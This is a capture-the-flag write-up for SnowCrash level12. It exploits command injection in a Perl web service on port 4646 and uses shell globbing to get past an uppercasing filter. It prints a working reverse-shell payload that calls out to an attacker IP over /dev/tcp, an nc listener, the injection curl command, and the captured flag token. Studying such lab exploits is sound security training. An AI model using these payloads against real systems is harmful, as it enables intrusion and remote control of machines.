- In `/home/user/level12` we find the Perl script `level12.pl` owned by `flag12` which shows a service running on localhost port 4646 that accepts an x and y parameter. Part of the code block shows that the x parameter contents are all turned into uppercase and if there is any whitespace or multiple words, only the first word is kept - everything after the space is stripped. The final string is passed into a string literal and executed.

```
<snip>
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
<snip>
```

- As the x parameter is passed into an egrep command and surrounded by double quotes, we should be able to carry out command injection by passing a payload into the x parameter. However, because the string we pass in is stripped of all words except the first one it will not be execute a payload such as a reverse shell script. Nor can we directly use the `getflag` payload because the output of the command will not be printed out to the screen. Therefore we can try to prepare a script with a reverse shell payload, and pass the script path as the payload to execute it.

- First start a listener on our attack machine
```
┌──(kali㉿kali)-[~/Desktop/SnowCrash]
└─$ nc -lnvp 4444              
listening on [any] 4444 ...
```

- Then on the target machine we need to prepare a script to execute a reverse shell. The script contents will be the payload `/bin/bash -c '/bin/sh -i >& /dev/tcp/<attackerIp>/4444 0>&1'` .  

- NOTE - The tricky thing here is that the Perl script will capitalize the string we pass into the x parameter so  if we create a script in /tmp/script it will become /TMP/SCRIPT. This wouldn't be a problem if we had permission to create a new folder in the root `/` of the drive but we are not permitted to. Therefore we will use a technique called globbing when we craft the payload for the x parameter.
-
```
level12@SnowCrash:/$ ls
bin   cdrom  etc   initrd.img  media  opt   rofs  run   selinux  sys  usr  vmlinuz
boot  dev    home  lib         mnt    proc  root  sbin  srv      tmp  var
level12@SnowCrash:/$ mkdir /TMP
mkdir: cannot create directory `/TMP': Permission denied
```

- First create a script in /tmp called `SCRIPT` and paste the reverse shell payload inside of it. Set the permissions to executable.
```
level12@SnowCrash:/$ cd /tmp
level12@SnowCrash:/tmp$ vim SCRIPT
level12@SnowCrash:/tmp$ cat SCRIPT
/bin/bash -c '/bin/sh -i >& /dev/tcp/10.13.200.129/4444 0>&1'
level12@SnowCrash:/tmp$ chmod +x SCRIPT
level12@SnowCrash:/tmp$ ls -d /tmp/SCRIPT
/tmp/SCRIPT
```

- We see the full path to the script is /tmp/SCRIPT which will become /TMP/SCRIPT once the script runs. However, thanks to globbing which uses `*` wildcard to match and expand any string in shell. So if we run `/*/SCRIPT` it will expand all directories at root level, no matter what they are called, and searches each directory for `SCRIPT`. We execute the curl command below to run the `SCRIPT` we prepared.

```
level12@SnowCrash:/tmp$ curl localhost:4646/?x="$(/*/SCRIPT)"
```

- The script inside `/tmp/SCRIPT` is executed and a reverse shell is obtained on the attack machine. Running `getflag` obtains the token

```
┌──(kali㉿kali)-[~/Desktop/SnowCrash]
└─$ nc -lnvp 4444              
listening on [any] 4444 ...
connect to [10.13.200.129] from (UNKNOWN) [10.13.200.131] 58208
/bin/sh: 0: can't access tty; job control turned off
$ whoami
flag12
$ getflag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

- Use the token to authenticate to `level13`

```
level12@SnowCrash:/tmp$ su level13
Password: 
level13@SnowCrash:~$ 
```